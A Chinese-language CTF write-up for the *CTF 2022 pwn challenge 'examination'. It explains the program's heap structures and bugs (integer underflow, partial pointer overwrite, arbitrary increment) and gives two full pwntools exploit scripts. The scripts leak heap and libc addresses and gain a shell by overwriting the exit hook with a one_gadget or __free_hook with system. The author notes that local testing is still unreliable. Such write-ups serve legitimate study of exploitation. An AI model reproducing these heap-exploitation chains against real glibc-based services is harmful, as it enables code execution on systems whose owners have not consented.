# \*CTF star CTF 2022 pwn Examination

> challenge name: `examination`   level: 2(easy)     ret2school again
>
> file: `examination`, `libc-2.31.so`
>
> ld.so and .i64 with comments provided
>
> writeup writer: hexhex16@outlook.com    https://github.com/kokifish
>
> refer writeup: 
>
> https://blog.csdn.net/weixin_46483787/article/details/124235711?spm=1001.2014.3001.5502 unsorted bin leak
>
> https://blog.csdn.net/yongbaoii/article/details/124245562  bss
>
> https://github.com/sixstars/starctf2022/tree/main/pwn-examination  official wp
>
> https://blog.csdn.net/Azyka/article/details/124286497 FSOP, no exit hook
>
> https://blog.csdn.net/weixin_52640415/article/details/124231298 no exit hook, no FSOP
>
> 赛时找完vul想完思路后就去做re了（因为有师傅已经出了），赛后搜了下，解法挺多的，看各路神仙的做法学到了很多，遂详细分析不同解法涉及到的知识点，尽我所能详细讲述，同时总结知识点，学习不懂的地方。

不同解法还没写完，而且本地测试有问题，还在探索。本地tcache貌似会出错，具体位置在i64`add_student`的汇编处有注释。

最简单的解法是利用unsorted bin泄露libc，然后改free hook为system，`free(addr)->system("/bin/sh\0")`



> # Key Principles
>
> - calloc: NOT get chunk from tcache first
> - exit hook: 
> - a bss ptr: 

# Program Logic

典型表单题，但依据具体角色，分为`<0.teacher/1.student>`，教师、学生表单功能分别如下：

```cpp
struct stu:   0x20 size, 0x30 chunk size                    0x31
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|8-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+16
|              p2info                  |                                           |
|  pray set:mode ptr; unset:prayscore  |+0x18       pray      | +0x1C   reward     |
|       x invalid addr x               |         next chunk size field             |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|
    
struct info:  student information                            0x21
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|8-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+16
|        Qnum       |+4    score       |                 p2review                  |
|        review_size (int)             |         next chunk size field             |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|

mode: 0x31 chunk, to store mode str of a student. 当pray set且stu+0x10处不为null，stu.mod(stu+0x10)才会存储mode的地址
review: user input size, size stored in info+0x10. 用于存储teacher写的review
// 需要注意，在gef中，每8B为一组展示时(x /20xg addr)，最右端的数字才是最低地址处的值，与上面展示的内存视图会有顺序上的不同，可对照IDA分析
x /10xg 0x555555f212f0-0x10 // 某个stu chunk内存上的视图如下：
0x555555f212e0: 0x0000000000000000      0x0000000000000031
0x555555f212f0: 0x0000555555f21320      0x0000000000000000 // +0处的指针指向 struct stu[id].info
0x555555f21300: 0x0000000000000000      0x0000000000000001 // 这个1表示stu+0x18的那一字节为0x01 // 即该stu pray被置1了
```



教师：

1. `add_student`: calloc(chk 0x30) 作为stu结构体，用bss上的arr记录stu地址，并calloc(chk 0x20)为该stu对应的info结构体，将&info的值填到stu第一个8B上。后续用stu.info表示这个0x20的chunk。然后读入一个问题数量Qnum(int)，保存在stu.info的第一个4B上，即stu.info[0,4]这4字节存储的是Qnum
2. `give_score`: 生成随机数score并模Qnum\*10，如果学生pray被置1了，则score-=10，将score存储到stu.info+4的位置上，即stu.info[4,8]这4字节存储的是score。
3. `write_review`: 对指定id的学生malloc`(0,1023]`的review，赋值到stuinfo.reviw(stuinfo+8)，把size存到stuinfo+0x10
4. `delete_student`: `free stuinfo.review, stuinfo, stu，student_arr[idx]=0, --student_cnt (a bss int)`
5. `change_role`: 换角色
6. `hid_func`: `buf = malloc(0x300uLL);  buf_read(0LL, buf, 0x300LL);  exit(-1);`

学生：切换完student角色后，默认idx=0，表示0号学生

1. `do_test`: 无内容
2. `check_review(id)`: reward unset且stu[id].info.score>89: 可以对任意地址+1，然后`write(stdout, stu[id].info.review, stu[id].info.review_size)`
3. `pray(id)`: `stu[id] + 0x18B ^= 1` ，注意是与1异或，所以偶数次调用pray时，pray unset(`stu[id]+0x18=0`)
4. `set_mode(id)`: 
   - pray set: mode指针为null，calloc(chk0x30)，输入0x20长的str，赋值到新calloc的chunk上，将该chunk地址赋给stu.mode(stu+0x10)
   - pray unset: 输入\<101的int，赋值给stu+0x10的BYTE，即只改变stu+0x10这一个字节，不改变高字节
5. `change_role`: 换角色
6. `change_id`: 更改student idx，即上面用到的id



# Vulnerability

1. `pray`: 学生可以多次pray，偶数次pray时，可以覆盖掉原本在stu+0x10存储的mode chunk的地址的最低1B，可以覆盖为`<0x65`的值，从而改变stu.mode指向的地址，部分heap地址任意写。
2. `give_score`, `check_review`: Qnum=1时，如果pray set，则unsigned int score-=10，产生无符号整数下溢，变成很大的整数，满足`check_review`中score>89的条件，实现任意地址的值+=1，输出stu.info.review内容。但是需要注意里面有个读取str的函数有小bug，会把最后1B置`\0`，所以输入地址时需要在回车前多输入一个字符
3. `hid_func`: 调用exit
4. delete student后，bss上的`student_cnt-=1`，如果随后`add_student`，则会覆盖掉delete前最后一个bss上`stu_arr`的stu指针

# exit hook

> http://binholic.blogspot.com/2017/05/notes-on-abusing-exit-handlers.html
>
> https://www.freesion.com/article/9980545061/



# exp: unsorted bin leak + exit hook

1. 调用几次`add_student`，Qnum=1. stu1 pray set，`give_score`产生unsigned int 下溢，stu1.info.score变成很大的整数
2. 调用`set_mode`，给stu1 calloc出mode(0x30)。stu1 pray unset，调用`set_mode`输入pray score，覆盖掉stu[1].mode处存储的指针的最低1B，使其指向更高地址的stu[2] chunk addr-0x10
3. calloc几个review，对齐top chunk，改大stu[2] chunk size域(原本为0x31)
4. 把stu[2] free掉，进入unsorted bin，stu[2].info (0x20)进入tcache(0x20)
5. 调用1次`add_student`，存在stu[4]上，其中stu[4]从unsorted bin拿0x30，stu[4].info从unsorted bin拿0x20。这里的逻辑与calloc有关，calloc不首先看tcache，在这里0x30 0x20的chunk都是从unsorted bin拿的，随后stu1.info.review的地址与unsorted bin中唯一一个chunk(0x470)地址相同
6. stu1 check review, **tcache(0x310).cnt +=1**, leak `&stu1`, got heap base, output stu1.info.review, got libc base
7. add stu[5], overwrite stu[5].info.review to tcache(0x310).entry, cover tcache(0x310).e to exit_hook
8. malloc 0x310 from tcache(0x310), &chunk(0x310)==exit_hook, cover exit_hook to onegadget

```python
from pwn import *
context.arch = "amd64"
context.log_level = "debug"
IP = "172.20.2.7"
PORT = 26351
DEBUG = 1


if DEBUG:
    p = process(["./ld-2.31.so", "./examination"], env={"LD_PRELOAD": "./libc-2.31.so"})
    base = p.libs()[p._cwd + p.argv[1].decode().strip(".")]  # fix bytes str error in py3.9
    print("base:", base, p.libs())
    libc = ELF("./libc-2.31.so")
else:
    p = remote(IP, PORT)
    libc = ELF("./libc-2.31.so")


def ru(x): return p.recvuntil(x)
def se(x): return p.send(x)
def rl(): return p.recvline()
def sl(x): return p.sendline(x)
def rv(x): return p.recv(x)
def sa(a, b): return p.sendafter(a, b)
def sla(a, b): return p.sendlineafter(a, b)
def l64(): return u64(p.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))  # python 3.9 pass
def lg(s): return log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))


def debug(cmd=""):
    gdb.attach(p, cmd)


def dd():
    if DEBUG:
        cmd = ""
        # cmd += "b *%d\n" % (base + 0x15D5)
        # cmd += "b *%d\n" % (base + 0x154D)
        cmd += "set $a=%d\n" % (base + 0x5080)  # arrPtr
        debug(cmd)


def choice(choice_num: int):
    sla("choice>> ", str(choice_num))


def change_role(role):
    choice(5)
    sla("role: <0.teacher/1.student>: ", str(role))


def add_student(ques_num):
    choice(1)
    sla("enter the number of questions: ", str(ques_num))  # [1, 9]


def give_score():
    choice(2)


def write_review(id, size, comment):
    choice(3)
    sla("which one? > ", str(id))
    if(size > 0):
        sla("please input the size of comment: ", str(size))
    sa("enter your comment:", comment)


def call_parent(id):
    choice(4)
    sla("which student id to choose?", str(id))


def check_review():
    choice(2)


def pray():
    choice(3)


def change_id(id):
    choice(6)
    sla("input your id: ", str(id))


def set_mode(prayed: bool, score=0, mode="nothing"):
    choice(4)
    if(prayed == 1):  # prayed
        sla("enter your pray score: 0 to 100", str(score))
    else:  # not prayed
        sa("enter your mode!", mode)


def quit(content):
    choice(6)
    sla("never pray again!", content)


sla("role: <0.teacher/1.student>: ", str(0))

add_student(1)  # stu0
add_student(1)  # stu1
# ===Step-1: stu1 pray set, give score, unsigned int underflow
change_role(1)
change_id(1)
pray()  # stu1 pray set
change_role(0)
give_score()  # stu.info.score -= 10, int underflow

# ===Step-2: stu1 calloce mode(0x20), pray unset, overwrite the lowest Byte of stu1.mode
change_role(1)
change_id(1)
pray()  # stu1 pray unset
set_mode(False, 0, 'a' * 0x20)
pray()  # stu1 pray set

set_mode(True, 0x60, "a")  # modify lowest Byte of stu1.mode to 0x60 # stu1.mode -> stu2 chk addr

# ===Step-3: chunk align, overwrite chk size of stu2
change_role(0)

add_student(1)  # stu2 # 0x30+0x20
write_review(1, 0x300, 'a' * 8)  # 0x310
add_student(1)  # stu3 # 0x30+0x20
write_review(3, 0x100, 'a' * 8)  # 0x110
add_student(1)  # stu4 # 0x30+0x20

change_role(1)
change_id(1)  # stu1
pray()  # stu1 pray unset #
set_mode(False, 0, p64(0) + p64(0x4c1))  # modify stu2 chk.size to 0x4c1

# ===Step-4: free stu2 to unsorted bin, stu[2].info (0x20) to tcache(0x20)
change_role(0)
call_parent(2)  # delete stu2(chk.size=0x4c1) to unsorted bin, delete stu2.info(chk0x20) to tcache

# ===Step-5: new stu[4], calloc 0x30 0x20 from unsorted, then &stu1.info.review == &unsoretd bin.chunk
add_student(1)  # new stu2(actul idx:4), overwrite stu4
# calloc(0x30): stu2(0x30) from unsorted bin # now tcache(0x20) 1 chk, unsorted bin 1 chk(0x490). same chk addr
# calloc(0x20): stu2.info(0x20) # call __libc_calloc, int_malloc, get a chk(0x20) from unsorted bin
# now tache(0x20)cnt=1, unsorted bin 0x470 # &tcache.chk(0x20).addr +0x20 =  &unsorted_bin.chk
# then stu2.info+0=1(Ques num) stu2.info+8=0, tcache(0x20) chk corrupted, next and key fields changed
# stu1.info.review now is the addr of the only chunk in unsorted bin # stu1.info.review (0x470) in unsorted bin
# NOTE: why 0x470, why not 0x4c0-0x30. calloc NOT get chunk in tcache first

# ===Step-6: stu1 check review, tcache(0x310).cnt+=1, leak &stu1, got heap base, output stu1.info.review, got libc base
change_role(1)
change_id(1)  # stu1
choice(2)  # stu1 check review # if score>89( (*stu[idx])+4>89 ) : leak addr of stu[id]
ru("Good Job! Here is your reward! ")  # get &stu1(addr of stu1) # a addr in heap
heapbase = int(p.recv(14), 16) - 0x2f0  # &stu1 - (&stu1 - heap_base)
lg("heapbase")
add1_addr = str(heapbase + 0x6e) + '0'  # '0' will be overwrite to \0, it's a small bug in input addr str
print("add1_addr", hex(int(add1_addr)))
# tcache 0x310 counts += 1 # counts array element: 2B
sla("add 1 to wherever you want! addr: ", str(heapbase + 0x6e) + '0')  # tcahce_cnt(0x310)
ru("here is the review:\n")  # stu1.info.review not is a addr in unsorted bin(libc)
libcbase = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00')) - (0x7f2cd0e93be0 - 0x7f2cd0ca7000)
lg("libcbase")

exit_hook = libcbase + 0x222f70
one_gadget_all = [0xe3b2e, 0xe3b31, 0xe3b34]
onegadget = libcbase + one_gadget_all[0]
# onegadget = libcbase + libc.symbols["puts"]
lg("onegadget")

# ===Step-7: add stu[5], overwrite stu[5].info.review to tcache(0x310).entry, cover tcache(0x310).e to exit_hook
change_role(0)
# unsorted bin 0x470
add_student(1)  # stu[5] # get stu 0x30(heapbase+0x3c0) stuinfo 0x20(heapbase+0x3f0) from unsorted bin
# unsorted bin 0x420

# heapbase + 0x3f0: &stu[5].info
# heapbase + 0x208: tcache(0x310).entry # the addr overwrited is stu[5].info.review
dd()  # DEBUG: DEBUG
write_review(1, 0, p64(heapbase + 0x3f0) + p64(0) * 4 + p64(0x21) + p64(0) + p64(heapbase + 0x208) + p64(0x10))

write_review(5, 0, p64(exit_hook))  # overwrite tcache(0x310).entry to exit_hook

# ===Step-8: malloc 0x310 from tcache(0x310), &chunk(0x310)==exit_hook, cover exit_hook to onegadget
choice(6)  # malloc 0x310 get exit_hook
p.sendline(p64(onegadget))  # overwrite exit_hook to onegadget

p.interactive()
```





# exp: unsorted bin + free hook

> info指0x20大小的chunk，是0x30大小的stu结构体的第一个地址所指向的结构体，review指的是comment

核心在于放一个chunk到unsorted bin，然后拿回一个chunk，该chunk可以控制另一stu的`0x30, 0x20`的chunk，利用stu.info.p2review这个指针，以及review的可编辑，覆盖free hook为system

1. unsigned underflow: calloc 3个stu，stu0的review chk size=`0x390`自始至终只有stu0是pray set的，stu2是为了避免top chunk合并。give score，stu0的score整数下溢
2. increase chk size: 利用任意地址加一，让stu0的review chk size=`0x490`。此时这个chunk实际上已经包括了stu1的`0x30,0x20`的chunk
3. to unsorted bin: free掉`0x490`的chk (stu0.review)到unsorted bin，为了后面calloc回来的chk可以编辑stu1的数据，先calloc一个stu (new stu2)，从unsorted bin拿`0x30,0x20`的chk
4. leak libc: 给new stu2 calloc一个`0x390`的chk，这个chk的区域会覆盖住stu1的`0x30,0x20` chk。覆盖stu1.p2info到一个可控制的地址，在这个地址上构造一个fake info，fake_info.p2review指向unsorted bin里的chk的地址，然后就可以输出stu1.review达到输出unsorted bin上libc地址的目的
5. cover free hook to system, get shell: 同样利用stu2.review，控制stu1.p2info指向fake info，fake info.p2review指向 `&__free_hook`，编辑stu1.review改`__free_hook`的值为`&system`，同时stu2.review=`"/bin/sh\0"`。调用`free(&stu2.review)`变成了 `system(&"/bin/sh\0")`

```python
from pwn import *
context.arch = "amd64"
context.log_level = "debug"
IP = "172.0.0.0"
PORT = 123
DEBUG = 1

if DEBUG:
    p = process("./examination")
    base = p.libs()[p._cwd + p.argv[0].decode().strip(".")]  # fix bytes str error in py3.9
    success("base:", base, p.libs())
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    p = remote(IP, PORT)  # *ctf{ret2sch00l_ret2examination_0nce_ag@1n!}
    libc = ELF("./libc-2.31.so")


def ru(x): return p.recvuntil(x)
def se(x): return p.send(x)
def rl(): return p.recvline()
def sl(x): return p.sendline(x)
def rv(x): return p.recv(x)
def sa(a, b): return p.sendafter(a, b)
def sla(a, b): return p.sendlineafter(a, b)
def l64(): return u64(p.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))  # python 3.9 pass
def lg(s): return log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))


def debug(cmd=""):
    gdb.attach(p, cmd)


def dd():
    if DEBUG:
        cmd = ""
        # cmd += "b *%d\n" % (base + 0x15D5)
        # cmd += "b *%d\n" % (base + 0x154D)
        cmd += "set $a=%d\n" % (base + 0x5080)  # arrPtr
        debug(cmd)


def menu(choice):
    sla("choice>> ", str(choice))


def add_student(Qnum=1):
    menu(1)
    sla("enter the number of questions: ", str(Qnum))


def give_score():
    menu(2)


def write_review(index, size, ctx):  # size [1, 0x3ff]
    menu(3)
    sla("which one? > ", str(index))
    if(size > 0):
        sla("please input the size of comment: ", str(size))
    sa("enter your comment:", ctx)


def call_parent(index):
    menu(4)
    sla("which student id to choose?", str(index))


def change_id(id):
    menu(6)
    sla("input your id: ", str(id))


def change_role(role):
    menu(5)
    sla("role: <0.teacher/1.student>: ", str(role))


def pray():
    menu(3)


def set_mode(ctx, score=0):
    menu(4)
    if score > 0:
        sla("enter your pray score: 0 to 100", str(score))
    else:
        sa("enter your mode!", ctx)


# Step-1: new students, stu0 pray set, give score, stu0 score underflow
sla('role: <0.teacher/1.student>: ', str(0))

add_student()  # 0
write_review(0, 0x380, "stu000000000")  # stu0.review chk size=0x391
add_student()  # 1
write_review(1, 0xa0, "stu11111111")
add_student()  # 2


change_role(1)  # to stu0
pray()  # stu0 pray set
change_role(0)  # to teacher
give_score()  # stu0 score < 0

# Step-2: leak heap addr and let stu0.review chk_size from 0x391 to 0x491
change_role(1)  # to stu0
menu(2)  # stu0 pray set, so return &stu0, add 1 to an address
ru("0x")
stu0base = int("0x" + str(p.recv(12), encoding="utf-8"), 16)
heap_base = stu0base - 0x2a0
sla('add 1 to wherever you want! addr: ', str(heap_base + 0x2e9) + '0')
success("heap_base:" + hex(heap_base) + "stu0base:" + hex(stu0base))

# Step-3: delete stu0, stu0.review(0x490) to unsorted bin, new stu, get chk from unsorted bin
change_role(0)  # to teacher
call_parent(0)  # stu0.review to unsorted bin 0x490 # stu0 to tcache(0x30) stu0.info to tcache(0x30)
add_student()  # new stu2, old stu2 covered by this new stu2
# calloc get unsorted bin first, NOT tcache
# 0x490-0x30-0x20 # now unsorted: 0x440

# Step-4: get 0x390 from unsorted, cover stu1 and stu1.info
# let stu1.pinfo->fake_info, fake_info.p2review->chk in unsorted bin. print stu1.review, leak libc
# now unsorted: 0xb0
write_review(2, 0x388, p64(0xdeadbeef).ljust(0x338, b"\0") +
             flat(0x31, heap_base + 0x6b0, 0, 0, 0, 0, 0x21, 1, heap_base + 0x6d0, 0xa0))
# cover stu1 chksize=0x31, stu1.pinfo=heap_base + 0x6b0 (fake stu1.info construct later)
# fake stu1.info: chksize=0x21, Qnum=1; ptr2review=chk in unsorted bin ; review_size=0xa0

# now stu1.info.preview point to unsorted bin chk(0xb0), now leak libc(stu1.review)
change_role(1)  # to student
change_id(1)  # to stu1
menu(2)  # stu1 pray NOT set, print review only
libc_addr = l64()  # leak libc
libc_base = libc_addr - 0x70 - libc.sym["__malloc_hook"]  # for local/remote libc compatibility
libc.address = libc_base
success("libc_addr:" + hex(libc_addr) + " libc_base:" + hex(libc_base))

# Step-5: cover stu2.review="/bin/sh\0", cover __free_hook to &system, trigger system("/bin/sh\0")
change_role(0)  # to teacher
write_review(2, 0, b"/bin/sh\0" + b"\0" * 0x330 + flat(0x31, heap_base + 0x6b0,
             0, 0, 0, 0, 0x21, 1, libc.sym["__free_hook"], 8))
# stu1.pinfo->fake_stuinfo, fake_stuinfo.p2review->&__free_hook
write_review(1, 0, p64(libc.sym["system"]))  # x/2xg &__free_hook is &system now
# cover free_hook i.e. stu1.info.review to &system
dd()  # DEBUG:
call_parent(2)  # free stu2
# origin: free(&stu2.review)# now: system("/bin/sh\0") # &stu2.review is &"/bin/sh\0" now

p.interactive()

```









